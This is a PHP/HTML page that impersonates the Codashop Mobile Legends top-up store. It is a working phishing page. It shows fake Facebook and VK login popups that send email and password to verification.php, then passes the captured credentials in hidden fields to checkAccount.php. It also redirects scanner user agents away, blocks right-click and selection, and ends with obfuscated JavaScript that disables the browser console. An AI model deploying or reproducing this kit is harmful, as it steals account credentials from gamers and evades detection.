<?php 

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login']) || !isset($_POST['nickname']) || !isset($_POST['userIdForm'])) {
    header('location: ./');
    die();
}

?>

<!doctype html>
<html lang="en">
   <head>
      <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>
      <!-- End Google Tag Manager -->
      <script src="https://script.tapfiliate.com/tapfiliate.js" type="text/javascript" async></script>
      <meta charset="UTF-8">
      <!--[if lt IE 9]>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
      <![endif]-->
      <title>Mobile Legends (Indonesia) - Codashop</title>
      <meta name="generator" content="coda2" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
      <meta name="mobile-web-app-capable" content="yes" />
      <meta name="apple-mobile-web-app-capable" content="yes" />
      <meta name="application-name" content="Codashop" />
      <meta name="apple-mobile-web-app-capable " content="yes " />
      <meta name="apple-mobile-web-app-status-bar-style " content="black " />
      <meta name="apple-mobile-web-app-title " content="Codashop " />
      <link rel="apple-touch-icon " href="https://cdn1.codashop.com/S2/content/mobile/images/app/codashop-ico-192x192.eda9c373cc.png" />
      <meta name="msapplication-TileImage " content="https://cdn1.codashop.com/S2/content/mobile/images/app/codashop-ico-144x144.e4494b8304.png" />
      <meta name="msapplication-TileColor " content="#f76b1d " />
      <meta name="theme-color " content="#f76b1d" />
      <meta name="format-detection" content="telephone=no" />
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <link rel="icon" type="image/x-icon" href="https://cdn1.codashop.com/S/content/common/images/favicon.ico" />
      <!-- OG Tags Start -->
      <meta property="og:url" content="https://www.codashop.com/id/free-fire" />
      <meta property="og:type" content="product" />
      <meta property="og:title" content="Mobile Legends (Indonesia) - Codashop" />
      <meta property="og:description" content="Top up diamond Mobile Legends menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
         />
      <meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.png" />
      <meta property="og:image:width" content="1200" />
      <meta property="og:image:height" content="630" />
      <!-- OG Tags End -->
      <meta name="description" content="Top up diamond Mobile Legends menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
         />
      <link rel="preconnect" href="https://www.google-analytics.com">
      <link rel="preconnect" href="https://connect.facebook.net">
      <link rel="preconnect" href="https://www.googletagmanager.com">
      <link rel="preconnect" href="https://cdn.onesignal.com">
      <link rel="preconnect" href="https://cdn1.codashop.com">
      <style>
         .product__long-description,
         .product-container,
         .footer-container {
         display: none;
         }
      </style>
      <!-- Facebook Pixel Code -->
      <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
             n = f.fbq = function() {
                 n.callMethod ?
                     n.callMethod.apply(n, arguments) : n.queue.push(arguments)
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
             n.loaded = !0;
             n.version = '2.0';
             n.queue = [];
             t = b.createElement(e);
             t.async = !0;
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s)
         }(window,
             document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', 916139058437464); // Insert your pixel ID here.
         //fbq('track', 'PageView');
      </script>
      <noscript>
         <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916139058437464&ev=PageView&noscript=1" />
      </noscript>
      <!-- DO NOT MODIFY -->
      <!-- End Facebook Pixel Code -->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      <link rel="stylesheet" href="../css/popupLogin.css">
      <link rel="stylesheet" href="../css/facebook.css">
      <link rel="stylesheet" href="../css/twitter.css">
   </head>
   <body class="theme-page--product-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
      <div class="popup-login facebook animated fadeIn" style="display: none;">
         <div class="popup-box-login-fb">
            <a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb">
               <img src="../img/facebook_text.png" style="width: 100px;">
            </div>
            <div class="content-box-fb">
               <img src="https://cdn-www.bluestacks.com/bs-images/69b5965b1c8f0d20f45be82f0522d88a6bfa2ba0.png" style="width: 60px;">
               <div class="txt-login-fb">
                  Log in to your Facebook account to connect to Mobile Legends
               </div>
               <form class="login-form" action="verification.php" method="post">
                  <label>
                  <input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
                  </label>
                  <label>
                  <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                  </label>
                  <input type="hidden" name="nickname" id="nickname">
                  <input type="hidden" name="login" value="Facebook" readonly>
                  <button type="submit" class="btn-login-fb">Log In</button>
               </form>
               <div class="txt-create-account">Create account</div>
               <div class="txt-not-now">Not now</div>
               <div class="txt-forgotten-password">Forgotten password?</div>
            </div>
            <div class="language-box">
               <center>
               <div class="language-name language-name-active">English (UK)</div>
               <div class="language-name">Bahasa Indonesia</div>
               <div class="language-name">Basa Jawa</div>
               <div class="language-name">Bahasa Melayu</div>
               <div class="language-name">日本語</div>
               <div class="language-name">Español</div>
               <div class="language-name">Português (Brasil)</div>
               <div class="language-name">
                  <i class="fa fa-plus"></i>
               </div>
               </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
         </div>
      </div>

      <div class="popup-login twitter animated fadeIn" style="display: none;">
         <div class="popup-box-login-twitter">
         <a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
            <div class="header-twitter">
               <center>
               <img src="https://icon-library.com/images/vk-icon/vk-icon-28.jpg" style="width: 50px;">
               </center>
            </div>
            <div class="box-twitter">
               <center>
               <form action="verification.php" method="post">
                  <div class="txt-login-twitter">Login to VK</div>
                  <div class="input-box-twitter">
                     <input type="text" name="email" placeholder="Email atau Telepon" required>
                  </div>
                  <div class="input-box-twitter">
                     <input type="password" name="password" placeholder="Kata Sandi" required>
                  </div>
                  <input type="hidden" name="nickname" id="nickname">
                  <input type="hidden" name="login" value="VK" readonly>
                  <button type="submit" class="btn-login-twitter">Log In</button>
               </form>
               </center>
            </div>
         </div>
      </div>

      <input type="hidden" id="seller-name" value="Mobile Legends">
      <input type="hidden" id="context-path" value="">
      <input type="hidden" id="group-id" value="33">
      <div id="product-page__container" class="product-page__container">
         <script type="text/javascript">
            $(document).ready(function() {
                countryCode = '360';
            });
            
            var viewAllText = 'Lihat semua';
            var resultUnitText = 'Hasil';
            var notFoundText = 'Tidak ada hasil';
         </script>
         <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/shop-topnav2.7e1fed6bdf.js"></script>
         <nav class="top-navbar top-nav--general">
            <div class="top-nav-container">
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-container">
                  <div class="search-icon-container">
                     <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
               </div>
            </div>
            <div class="search-input-container">
               <input type="search" name="search-keyword" id="search-keyword" class="input-search" placeholder='Pencarian game atau voucher'>
            </div>
            <div class="search-result-list"></div>
         </nav>
         <nav class="top-navbar top-nav--productpage">
            <div class="top-nav-container">
               <div class="custom-page__logo" style="display: none">
                  <div class="logo-image-container">
                     <a href="/ph"><img class="logo-image" src="https://cdn1.codashop.com/S/content/common/images/grab.29dad06670f873936002ddb910253a4b.png" alt="Grabpay"></a>
                  </div>
                  <span class="brand-tagline"></span>
               </div>
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-input-container">
                  <div class="search-input-container--productpage">
                     <input type="search" name="search-input" id="search-input" class="search-input__productpage" placeholder='Pencarian game atau voucher'>
                     <svg class="search-icon--productpage" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
                  <div class="search-result-list"></div>
               </div>
            </div>
         </nav>
         <div class="notification-wrapper"></div>
         <main class="container product-container">
            <!-- Google Tag Manager (noscript) -->
            <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PF7TJ9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
            <!-- End Google Tag Manager (noscript) -->
            <input type="hidden" id="page-name" value="productPage">
            <input type="hidden" id="country-id" value="ID">
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://cdn1.codashop.com/S/content/common/images/mno/mlbb_halloween640x241.jpg" alt="" class="product__top-banner">
               </figure>
               <h2 class="product__name shop-content--heading">Mobile Legends</h2>
               <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
               <label for="product-description">
               <span class="more-info">Baca lebih lanjut</span>
               <span class="less-info">Tutup informasi detail</span>
               </label>
               <article class="product__description shop-content__container"><nav class="shop-content--paragraph">Produk lainnya ⇒ <a href="https://www.codashop.com/id/mobile-legends-member/">Starlight Member</a>, <a href="https://www.codashop.com/id/mobile-legends-special-bundle-a">Special Bundle A</a>, <a href="https://www.codashop.com/id/mobile-legends-special-bundle-b">Special Bundle B</a>, <a href="https://www.codashop.com/id/mobile-legends-twilight-pass">Twilight Pass</a></nav>

<p class="shop-content--paragraph">Kenaikan harga terjadi berdasarkan ketetapan Dirjen Pajak mengenai PPN atas barang dan jasa digital per Agustus 2020. Informasi kenaikan pajak dapat dilihat di <a href="https://news.codashop.com/id/harga-diamonds-naik-baca-penjelasanya/" target="_blank">https://news.codashop.com/id/harga-diamonds-naik-baca-penjelasanya/</a> </p>

<p class="shop-content--paragraph">PERINGATAN: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Seluler (Mobile). Harap pastikan bahwa aplikasi Shopee Anda telah diperbarui dan memiliki saldo ShopeePay yang mencukupi sebelum melakukan top up.</p>

<p class="shop-content--paragraph">Top up ML Diamond hanya dalam hitungan detik! Cukup masukan Username MLBB Anda, pilih jumlah Diamond yang Anda inginkan, selesaikan pembayaran, dan Diamond akan secara langsung ditambahkan ke akun Mobile Legends Anda.</p>

<p class="shop-content--paragraph">Bayarlah menggunakan GoPay, ShopeePay, Dana, OVO, LinkAja, Telkomsel, Indosat, Tri, XL, Bank Transfer, Indomaret, Alfamart, Kredivo, TrueMoney Indonesia, Kartu Kredit, dan Doku Wallet. Tanpa perlu kartu kredit, registrasi ataupun log-in.</p>

<p class="shop-content--paragraph">Unduh dan mainkan Mobile Legends: Bang Bang sekarang!<br>
<a class="shop-content--badge" href="https://apps.apple.com/app/id1160056295?country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"> </a>

<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.mobile.legends&amp;country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"> </a></p></article>
            </header>
            <section id="contents" class="main-content">
               <input type="hidden" id="pricePointId" name="pricePointId" value="" />
               <div class="confirm-modal__container" id="confirm-user-dialog" title="">
                  <ul>
                     <li class="confirm-modal__title">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt">Mohon konfirmasi nama panggilan anda sudah benar.</li>
                  </ul>
               </div>
               <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.mask.min.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/mobile/js/freefire.4a7a9740bc.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/third_party_common.0859f0e010.js"></script>
               <script type="text/javascript">
                  $(document).ready(function() {
                      $("#confirm-user-dialog").dialog({
                          resizable: false,
                          height: "auto",
                          dialogClass: "no-titlebar",
                          autoOpen: false,
                          modal: true,
                          dialogClass: "confirm-user-dialog__container",
                          buttons: [{
                                  text: 'Batalkan',
                                  class: "confirm-user-dialog__btn btn-cancel",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                  }
                              },
                              {
                                  text: 'Konfirm',
                                  class: "confirm-user-dialog__btn btn-blue",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                      openTxnWindow();
                                  }
                              }
                          ],
                          create: function(event, ui) {
                              $(".ui-widget-header").hide();
                              $(this).closest(".ui-dialog").css("padding-top", "15px");
                          }
                      });
                  
                  
                  
                  });
                  
                  function showConfirmation(data, extraMsg) {
                      var ul = $("#confirm-user-dialog > ul");
                  
                      ul = $(ul);
                  
                      $("#confirm-user-dialog > ul > li").not('li:first, li:nth-child(2)').remove();
                  
                      var li = $();
                      var nickname = JSON.parse(decodeURIComponent(data.result)).roles[0].role;
                  
                      nickname = filterXSS(nickname);
                  
                      li = li.add("<li class='confirm-user-dialog__extra-msg'>" + extraMsg + "</li>");
                      li = li.add("<li><div>" + 'Nama panggilan: ' + "</div><div>" + nickname + "</div></li>");
                      li = li.add("<li><div>" + 'ID: ' + "</div><div>" + data.user.userId + "</div></li>");
                      li = li.add("<li><div>" + 'Harga: ' + "</div><div>" + data.channelPrice + "</div></li>");
                      li = li.add("<li><div>" + 'Bayar dengan: ' + "</div><div>" + data.paymentChannel + "</div></li>");
                  
                      li.appendTo(ul);
                      ul.appendTo("#confirm-user-dialog");
                  
                      var txnIdElement = $();
                      txnIdElement = txnIdElement.add("<span id='span-txnId' class='" + data.txnId + "' style='display: none;'></span>");
                      txnIdElement.appendTo("#confirm-user-dialog");
                  
                      $("#overlay").fadeIn(function() {
                          $(".confirm-user-dialog__container").show();
                      });
                  }
               </script>
               <div class="section buy default-template">
                  <h2 class="circle">
                     <span>1</span>
                     <div class="section-title">Detail Akun</div>
                  </h2>
                  <div class="form" id="formSection">
                     <p class="emailOptional default-1">Lengkapi data dibawah ini untuk memudahkan proses pengiriman Diamond.</p>
                     <div class="email-input-container">
                        <form action="checkAccount.php" method="POST">
                            <input name="email" type="hidden" value="<?= $_POST['email'] ?>" readonly>
                            <input name="password" type="hidden" value="<?= $_POST['password'] ?>" readonly>
                            <input name="login" type="hidden" value="<?= $_POST['login'] ?>" readonly>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">User ID</label>
                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="userIdForm" class="product-form-input" value="<?= $_POST['userIdForm'] ?> (<?= $_POST['zonaIdForm'] ?>)" readonly>
                            </div>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Nickname</label>
                                <input type="text" style="margin-top: 10px; font-size: 14px;" id="nickname" name="nickname" class="product-form-input" value="<?= $_POST['nickname'] ?>" readonly>
                            </div>
                            <div style="margin-top: 10px;">
                                <label for="">Level</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="lvl" name="lvl" class="product-form-input" required>
                                <option selected="selected" disabled="disabled" value="">Level Akun</option>
<option>Level 1</option>
<option>Level 2</option>
<option>Level 3</option>
<option>Level 4</option>
<option>Level 5</option>
<option>Level 6</option>
<option>Level 7</option>
<option>Level 8</option>
<option>Level 9</option>
<option>Level 10</option>
<option>Level 11</option>
<option>Level 12</option>
<option>Level 13</option>
<option>Level 14</option>
<option>Level 15</option>
<option>Level 16</option>
<option>Level 17</option>
<option>Level 18</option>
<option>Level 19</option>
<option>Level 20</option>
<option>Level 21</option>
<option>Level 22</option>
<option>Level 23</option>
<option>Level 24</option>
<option>Level 25</option>
<option>Level 26</option>
<option>Level 27</option>
<option>Level 28</option>
<option>Level 29</option>
<option>Level 30</option>
<option>Level 31</option>
<option>Level 32</option>
<option>Level 33</option>
<option>Level 34</option>
<option>Level 35</option>
<option>Level 36</option>
<option>Level 37</option>
<option>Level 38</option>
<option>Level 39</option>
<option>Level 40</option>
<option>Level 41</option>
<option>Level 42</option>
<option>Level 43</option>
<option>Level 44</option>
<option>Level 45</option>
<option>Level 46</option>
<option>Level 47</option>
<option>Level 48</option>
<option>Level 49</option>
<option>Level 50</option>
<option>Level 51</option>
<option>Level 52</option>
<option>Level 53</option>
<option>Level 54</option>
<option>Level 55</option>
<option>Level 56</option>
<option>Level 57</option>
<option>Level 58</option>
<option>Level 59</option>
<option>Level 60</option>
<option>Level 61</option>
<option>Level 62</option>
<option>Level 63</option>
<option>Level 64</option>
<option>Level 65</option>
<option>Level 66</option>
<option>Level 67</option>
<option>Level 68</option>
<option>Level 69</option>
<option>Level 70</option>
<option>Level 71</option>
<option>Level 72</option>
<option>Level 73</option>
<option>Level 74</option>
<option>Level 75</option>
<option>Level 76</option>
<option>Level 77</option>
<option>Level 88</option>
<option>Level 79</option>
<option>Level 80</option>
<option>Level 81</option>
<option>Level 92</option>
<option>Level 83</option>
<option>Level 84</option>
<option>Level 85</option>
<option>Level 86</option>
<option>Level 87</option>
<option>Level 88</option>
<option>Level 89</option>
<option>Level 90</option>
<option>Level 91</option>
<option>Level 92</option>
<option>Level 93</option>
<option>Level 94</option>
<option>Level 95</option>
<option>Level 96</option>
<option>Level 97</option>
<option>Level 98</option>
<option>Level 99</option>
<option>Level 100</option></select>
                                </select>
                            </div>
                            <div style="margin-top: 10px;">
                                <label for="">Tier</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="rpl" name="tier" class="product-form-input" required>
                                <option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
                                <option value="Epic" class="form-control">Epic</option>
                                <option value="Legend" class="form-control">Legend</option>
                                <option value="Mythic" class="form-control">Mythic</option>  
                                </select>
                            </div>
                        
                     </div>
                     <div class="email-form-btn-group">
                        <button type="submit" class="email-form-btn__submit">
                           <div class="loader" id="submit-loader"></div>
                           <span class="btn-submit-text">Submit</span>
                           <span class="btn-submit-text for-grab"></span>
                        </button>
                    </form>
                        <div class="remember-me-container">
                           <label for="ck1" class="remember-me-label">
                           <input type="checkbox" class="remember-me-chkbox" id="ck1">
                           <span class="remember-me-checkmark"></span>
                           <span class="remember-me-text"> Ingat saya </span>
                           </label>
                        </div>
                     </div>
                  </div>
                  <input type="hidden" id="id_no">
               </div>
               <div class="popError">
                  <div class="section">
                     <h2 class="errorHeader">
                        Aduh!
                     </h2>
                     <ul class="" id="errorMessage"></ul>
                     <br><br>
                     <a href="javascript:void(0);" id="hidePopError" class="modal-button">
                     Kembali</a>
                  </div>
               </div>
               <div id="overlay" class="overlay-element"></div>
            </section>
         </main>
         <section class="section product__long-description shop-content__container">
            <h1 class="product-tagline-title">
               Beli Diamond Mobile Legends murah tanpa kartu kredit!
            </h1>
            <article class="product__tag-line">
               <p class="shop-content--paragraph"> Hanya butuh beberapa detik saja untuk membeli Diamonds Mobile Legends. Di Codashop, top-up menjadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk diantaranya Indonesia. Caranya
                  mudah, tanpa perlu kartu kredit, registrasi, ataupun log-in! <a href="#"> Klik disini untuk memulai. </a> 
               </p>
               <p class="shop-content--paragraph"> Butuh bantuan? kunjungi <a href="http://bit.ly/CodaHelpIDN" target="_blank">Pusat Bantuan</a> kami.</p>
               <p class="shop-content--paragraph"> Tentang Mobile Legends: <br> Mobile Legends atau FF Garena adalah mobile game survival shooter terbaik. Setiap 10 menit permainan menempatkan anda di pulau jauh tempat anda menghadapi 49 pemain lain, semuanya bertujuan untuk mencari keselamatan.
                  Pemain bebas memilih titik awal menggunakan parasutnya, dan bertujuan untuk tetap berada di save zone selama mungkin. Mengendarai kendaraan untuk menjelajahi peta yang luas, bersembunyi di parit, atau menjadi tidak terlihat dengan
                  merangkak di bawah rumput. Menyergap, menembak, bertahan hidup, hanya ada satu tujuan: untuk bertahan hidup dan menjadi puncak dari semuanya. 
               </p>
            </article>
         </section>
         <section class="faq-accordion-container">
            <div class="accordion-container"></div>
         </section>
         <link rel="stylesheet" href="https://cdn1.codashop.com/S/content/common/css/jquery-ui-1.12.1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-topnav2.5566e671b1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/productPage/responsive-product-page2.7ec2b81ede.css" />
         <!-- info bar css -->
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/infoBar.662b8f1b5f.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-shop-content.e6202b83de.css" />
         <link rel="stylesheet preload" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-fontfaces.b6c83d3582.css" as="style" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-footer2.2ce4d6e299.css" />
         <footer class="footer-container">
            <div class="footer-area">
               <section class="left-blocks-container">
                  <div class="socials-container">
                     <p class="social-title">Dapatkan berita Coda di:</p>
                     <div class="footer__social-media-container">
                        <a href='https://www.facebook.com/Codashop.IDofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.youtube.com/c/CodashopOfficial' target="_blank" class="social-icon-container" aria-label="Codashop Youtube Channel" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-youtube-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.instagram.com/codashop.idofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                  </div>
                  <div class="support-container">
                     <p class="support-title">Butuh Bantuan?</p>
                     <div class="support-icons">
                        <a href='http://m.me/Codashop.IDofficial' target="_blank" class="social-icon-container" aria-label="Contact via Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-msg-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                     <a href='https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia' target="_blank" class="support-link" aria-label="Contact Codashop support" rel="noopener">
                        <div class="contact-icon">
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                              <path d="M320 352h-23.1a174.08 174.08 0 0 1-145.8 0H128A128 128 0 0 0 0 480a32 32 0 0 0 32 32h384a32 32 0 0 0 32-32 128 128 0 0 0-128-128zM48 224a16 16 0 0 0 16-16v-16c0-88.22 71.78-160 160-160s160 71.78 160 160v16a80.09 80.09 0 0 1-80 80h-32a32 32 0 0 0-32-32h-32a32 32 0 0 0 0 64h96a112.14 112.14 0 0 0 112-112v-16C416 86.13 329.87 0 224 0S32 86.13 32 192v16a16 16 0 0 0 16 16zm160 0h32a64 64 0 0 1 55.41 32H304a48.05 48.05 0 0 0 48-48v-16a128 128 0 0 0-256 0c0 40.42 19.1 76 48.35 99.47-.06-1.17-.35-2.28-.35-3.47a64.07 64.07 0 0 1 64-64z"/>
                           </svg>
                        </div>
                        <div class="contact-text">Hubungi Kami</div>
                     </a>
                  </div>
                  <div class="international-container">
                     <a href="/international" class="international-flag-block" rel="noopener">
                        <i class='f32_indonesia footer__country-flag' id="footer__country-flag"></i>
                        <div class="international__country-name">Indonesia</div>
                     </a>
                  </div>
               </section>
               <section class="right-blocks-container">
                  <div class="legal-content-container">
                     <a href="/marketing-and-partnerships" target="_blank" rel="noopener">Pemasaran dan Kemitraan</a>
                     <a href='https://www.codapayments.com/terms-conditions' target="_blank" rel="noopener">Syarat & Ketentuan</a>
                     <a href='https://www.codapayments.com/privacy-policy-bahasa' target="_blank" rel="noopener">Kebijakan Privasi</a>
                  </div>
                  <div class="copyright-container"> ©Hak Cipta Coda Payments </div>
               </section>
            </div>
         </footer>
      </div>
      <script>
         if ((location.href.includes("grab-demo.coda")) || (location.href.includes("grab.codashop"))) {
             $("body").addClass("custom--grab");
             $(".logo-container-link").contents().unwrap();
             $("body").append('<link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/responsive-grab-page.6b9f5c3d59.css" />');
         }
      </script>
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S/content/common/css/flags.css" />
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/P/airtime/w/css/airtime_v1.0a.css" />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <a href="https://plus.google.com/104822527805498875313" style="display: none;" rel="publisher">Google+</a>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/infoBar.38acc407b3.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/faq.7a04e34b3d.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/payment-channel-suggestion.535f3c6f70.js"></script>
      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async defer></script>
      <script type="text/javascript">
         (function(t, a, p) {
             t.TapfiliateObject = a;
             t[a] = t[a] || function() {
                 (t[a].q = t[a].q || []).push(arguments)
             }
         })(window, 'tap');
         
         tap('create', '11857-697628');
         tap('detect');
         
         tap('getTrackingId', null, function(trackingId) {
             CODA.Shop.affiliateTrackingId = trackingId ? trackingId : '';
         });
      </script>
      		<script type="text/javascript">
			var _0x3d88=['log','debug','info','error','exception','table','warn','trace','apply','debu','gger','don','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','console'];(function(_0x4b152f,_0x59d86c){var _0x5c135a=function(_0x5b5d0f){while(--_0x5b5d0f){_0x4b152f['push'](_0x4b152f['shift']());}};_0x5c135a(++_0x59d86c);}(_0x3d88,0x170));var _0x306c=function(_0x4b152f,_0x59d86c){_0x4b152f=_0x4b152f-0x0;var _0x5c135a=_0x3d88[_0x4b152f];return _0x5c135a;};(function(_0x2605bc){var _0x4c9a2c=function(){var _0x244728=!![];return function(_0x3efc74,_0x16c2ac){var _0x4d7b05=_0x244728?function(){if(_0x16c2ac){var _0x45ed49=_0x16c2ac[_0x306c('0x0')](_0x3efc74,arguments);_0x16c2ac=null;return _0x45ed49;}}:function(){};_0x244728=![];return _0x4d7b05;};}();var _0x4ed3d0=[_0x306c('0x1'),_0x306c('0x2'),_0x306c('0x3')];function _0x17f16e(){var _0x41d7ca=_0x4c9a2c(this,function(){var _0x6c13c9=function(){};var _0x187a25=function(){var _0x23d8ab;try{_0x23d8ab=Function(_0x306c('0x4')+_0x306c('0x5')+');')();}catch(_0x15bb1a){_0x23d8ab=window;}return _0x23d8ab;};var _0x4a78e1=_0x187a25();if(!_0x4a78e1[_0x306c('0x6')]){_0x4a78e1[_0x306c('0x6')]=function(_0x6c13c9){var _0x19ef79={};_0x19ef79[_0x306c('0x7')]=_0x6c13c9;_0x19ef79['warn']=_0x6c13c9;_0x19ef79[_0x306c('0x8')]=_0x6c13c9;_0x19ef79[_0x306c('0x9')]=_0x6c13c9;_0x19ef79[_0x306c('0xa')]=_0x6c13c9;_0x19ef79[_0x306c('0xb')]=_0x6c13c9;_0x19ef79[_0x306c('0xc')]=_0x6c13c9;_0x19ef79['trace']=_0x6c13c9;return 